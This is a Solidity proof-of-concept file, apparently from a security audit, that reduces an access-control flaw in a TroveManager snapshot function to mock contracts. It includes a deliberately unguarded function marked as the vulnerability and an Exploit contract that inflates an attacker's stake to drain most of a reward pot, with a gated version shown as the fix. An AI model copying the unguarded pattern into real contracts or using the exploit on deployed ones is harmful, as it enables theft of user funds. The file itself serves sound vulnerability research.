// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Apollon TroveManager.updateSystemSnapshots_excludeCollRemainder (Recon, 53840)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: the snapshot update has no caller check. A stranger excludes almost
    all collateral, the next trove's stake is coll * stakesSnapshot / tinySnapshot,
    and that stake takes N more of a later distribution than a fair stake would. */

contract MockERC20 {
    string public name = "Coll";
    string public symbol = "COLL";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract TroveManager {
    struct CollRem {
        address collateral;
        uint256 remainder;
    }

    MockERC20 public reward;
    address public collateral;
    address public liquidationOperations;
    bool public immutable gated;

    uint256 public totalStakes;
    uint256 public totalStakesSnapshot;
    uint256 public activeCollateral;
    uint256 public totalCollateralSnapshot;
    uint256 public rewardPot;
    mapping(address => uint256) public stakes;

    constructor(MockERC20 r, address coll, address liq, bool gate) {
        reward = r;
        collateral = coll;
        liquidationOperations = liq;
        gated = gate;
        totalStakes = 100 ether;
        totalStakesSnapshot = 100 ether;
        activeCollateral = 100 ether;
        totalCollateralSnapshot = 100 ether;
        stakes[address(0xBEEF)] = 100 ether;
    }

    function updateSystemSnapshots_excludeCollRemainder(CollRem[] calldata remainders) external {
        if (gated) require(msg.sender == liquidationOperations, "not liquidation");
        uint256 excluded;
        uint256 n = remainders.length;
        for (uint256 i; i < n; ++i) {
            if (remainders[i].collateral == collateral) excluded += remainders[i].remainder;
        }
        // @> VULN: any caller can drop collateral out of the stake snapshot
        totalCollateralSnapshot = activeCollateral - excluded;
        totalStakesSnapshot = totalStakes;
    }

    function openTrove(uint256 coll) external returns (uint256 stake) {
        if (totalCollateralSnapshot == 0) {
            stake = coll;
        } else {
            stake = coll * totalStakesSnapshot / totalCollateralSnapshot;
        }
        stakes[msg.sender] = stake;
        totalStakes += stake;
        activeCollateral += coll;
    }

    function fund(uint256 amount) external {
        rewardPot += amount;
    }

    function claim() external returns (uint256 payout) {
        payout = stakes[msg.sender] * rewardPot / totalStakes;
        reward.transfer(msg.sender, payout);
    }
}

contract Exploit {
    uint256 public constant EXTRA = 900 ether;

    MockERC20 public reward; // nonce 1
    TroveManager public mgr; // nonce 2
    TroveManager public gated; // nonce 3

    uint256 public snapshotColl;
    uint256 public attackerStake;
    uint256 public paid;
    uint256 public fair;
    bool public strangerBlocked;

    constructor() {
        reward = new MockERC20();
        mgr = new TroveManager(reward, address(0xC011), address(0x1111), false);
        gated = new TroveManager(reward, address(0xC011), address(0x1111), true);
        reward.mint(address(mgr), 1100 ether);
        reward.mint(address(gated), 1100 ether);
    }

    function run() external {
        TroveManager.CollRem[] memory rows = new TroveManager.CollRem[](1);
        rows[0] = TroveManager.CollRem({collateral: address(0xC011), remainder: 99 ether});
        mgr.updateSystemSnapshots_excludeCollRemainder(rows);
        snapshotColl = mgr.totalCollateralSnapshot();
        require(snapshotColl == 1 ether, "snapshot");
        attackerStake = mgr.openTrove(10 ether);
        require(attackerStake == 1000 ether, "inflated stake");
        mgr.fund(1100 ether);
        paid = mgr.claim();
        fair = 100 ether; // 10 coll on a 110 coll system, of a 1100 pot
        require(paid == 1000 ether, "paid");
        require(paid - fair == EXTRA, "extra");

        try gated.updateSystemSnapshots_excludeCollRemainder(rows) {
            revert("stranger excluded");
        } catch {
            strangerBlocked = true;
        }
        require(strangerBlocked, "gate");
        uint256 fairStake = gated.openTrove(10 ether);
        require(fairStake == 10 ether, "fair stake");
    }
}
